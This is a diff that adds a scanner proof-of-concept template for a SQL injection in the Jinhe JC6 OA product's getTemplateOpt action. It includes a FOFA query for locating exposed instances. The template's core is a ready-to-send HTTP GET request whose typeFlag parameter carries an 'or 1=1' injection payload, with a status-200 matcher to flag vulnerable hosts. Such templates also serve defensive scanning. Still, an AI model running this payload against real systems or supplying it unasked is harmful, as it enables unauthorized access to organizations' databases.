@@ -1,0 +1,31 @@
+id: poc-fo2qvue9ax4nmfmt
+info:
+  name: 金和 JC6 getTemplateOpt 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fo2qvue9ax4nmfmt'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fo2qvue9ax4nmfmt
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'GET /jc6/platform/portalwb/dataSource/portalwb-data-source!getTemplateOpt.action?moduId=1&typeFlag=''or+1=1+or+''''%3d'' HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
